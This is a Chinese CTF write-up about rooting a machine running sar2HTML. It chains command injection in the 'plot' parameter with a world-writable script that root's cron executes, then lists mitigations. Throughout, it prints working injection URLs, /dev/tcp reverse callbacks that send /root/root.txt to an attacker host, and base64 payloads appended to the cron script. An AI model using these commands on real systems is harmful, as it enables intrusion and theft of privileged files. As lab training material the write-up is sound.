一台只开了 80 的机器，首页是 Apache 的默认页，`robots.txt` 里孤零零一行：`sar2HTML`。

顺着它找到应用。登录页的 `plot` 参数被直接拼进 shell：

```bash
curl -s "http://target/sar2HTML/index.php?plot=%3Bid"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

到这里只是 www-data。真正的 flag 在 `/root/root.txt`，读不到。

## 先看目录权限

```bash
?plot=;ls -la /var/www/html
```

一眼看到两行刺眼的东西：

```
-rwxr-xr-x 1 root     root        22 finally.sh
-rwxrwxrwx 1 www-data www-data 203 write.sh
```

再看 `/etc/crontab`：

```
*/5 * * * * root cd /var/www/html/ && sudo ./finally.sh
```

`finally.sh` 内容就两行：`#!/bin/sh` 加一句 `./write.sh`。而 `write.sh` 是 **777** —— 谁都能写。

root 每五分钟进这个目录跑一次 `finally.sh`，`finally.sh` 再去跑那个谁都能改的脚本。链条很清楚：往 `write.sh` 里加几行，等 cron。

## 第一个坑：我盯着的那个文件，根本不在目标上

一开始我加的是：

```sh
id > /tmp/zz_root.txt
cat /root/flag* /root/flag.txt 2>/dev/null >> /tmp/zz_root.txt
```

等了五分钟，读 `/tmp/zz_root.txt` —— 不存在。又等五分钟，还是没有。

`write.sh` 原来第一行是 `touch /tmp/gateway`，我去看这个文件，也没有。于是我当时很确信：这个 cron 从来没跑过。

**这个判断是错的。** 问题出在我看的地方 —— 那条 `ls -la /tmp` 是我在自己的 Kali 上敲的，屏幕上那些 `ik-jrt.bin`、`tmux-0` 根本不属于目标。命令注入把命令发到了目标上，可检查结果的命令跑在我自己机器上。

后来换了做法：不让它落文件，让它**连回来**。

```bash
# Kali 上
nc -lvnp 4444

# 目标上（www-data）
?plot=;bash -c 'echo hello > /dev/tcp/<kali-ip>/4444'
```

连接立刻到了。这才知道通道没问题，之前的"没跑"只是我在等一个永远不会出现在我机器上的文件。

## 第二个坑：`$(...)` 在我这边就展开了

第一次发回调，我图省事写成：

```bash
curl --data-urlencode "plot=;bash -c 'echo HELLO_$(id -un)_$(id -u) > /dev/tcp/<kali-ip>/4444'"
```

监听端收到 `HELLO_root_0`。

那一下心跳都快了 —— 以为直接拿到 root。真相很扫兴：外面是双引号，`$(id -un)` 在**我的机器上**（root）就展开了，发到目标的只是 `echo HELLO_root_0` 这几个字。

要发给远端执行的 `$(...)`、反引号、变量，得用单引号或者 base64 固定住：

```bash
cat > /tmp/cb.txt <<'EOF'
bash -c 'exec 3<>/dev/tcp/<kali-ip>/4444; echo uid=$(id -u) >&3; cat /root/root.txt >&3; exec 3<&-'
EOF
B=$(base64 -w0 /tmp/cb.txt)
curl --data-urlencode "plot=;echo '$B' | base64 -d >> /var/www/html/write.sh" "$URL"
```

`base64` 之后只剩编码字符，本地 shell 没地方去展开它。

## 第三个坑：`nc -l` 一次只接一个连接

我把回调**追加**进 `write.sh`，于是每轮 cron 会把所有历史行都跑一遍。第三次测试时，监听端收到的是上一轮那条旧回调，新的一直挂着不动 —— `nc -lvnp 4444` 接完一个连接就退了，第二个连接排到超时。

要么换端口，要么把 `write.sh` 重写成只留一条回调。我选了后者。

## 成功

```sh
#!/bin/sh
touch /tmp/gateway
bash -c 'exec 3<>/dev/tcp/<kali-ip>/4444; echo CRON2_UID_$(id -u) >&3; cat /root/root.txt >&3; exec 3<&-'
```

大概九十秒后，监听端：

```
CRON2_UID_0
CTF{root_flag_here}
```

`uid=0`，flag 到手。

## 顺带一个发现：扫描器报了两处，只有一处是真的

同一套扫描报了两条命令注入，参数分别是 `body:host` 和 `body:plot`。复核之后：

- `plot` 真的执行；
- `host` 只是被原样回显到页面里 —— payload 出现在响应里，看着像"打进去了"，其实什么也没发生。

只看响应体的判定方法下，这两种情况长得一模一样。区分它们是看行为而不是看回显：让 payload 做一件会改变响应的事（`;id` 会多出一行 `uid=`），或者干脆用带外回调。

## 修法

- cron 要跑的脚本，所有者和组都不该可写。需要"可变"的部分用配置文件，别用脚本本身。
- crontab 里写绝对路径，别 `cd` 之后再 `./xxx`；`sudo` 也没必要 —— root 的 cron 本来就在 root 下跑。
- 参数进 shell 之前别拼字符串：用 `execve` 传数组，或者干脆不调 shell。
- 这种"演示用"的文件不该出现在生产目录里。

## 复现清单

```bash
# 1. 注入
curl -s "$URL?plot=%3Bid"                       # uid=33(www-data)
# 2. 看提权面
?plot=;ls -la /var/www/html; cat /etc/crontab
# 3. 先验反向通道，再交给 cron
?plot=;bash -c 'echo hi > /dev/tcp/<kali-ip>/4444'
# 4. 追加 root 回调（base64 落盘，避免本地展开）
?plot=;echo '<b64>' | base64 -d >> /var/www/html/write.sh
# 5. 等 cron，读回调
```

写完回头看，三个坑其实都指向同一件事：**我总在相信一个不会立刻说话的东西** —— 一个可能没被创建的文件、一个被本地展开的变量、一条排队的连接。后来我把"先让它连回来"当成固定动作，这三个坑就都不会再踩了。
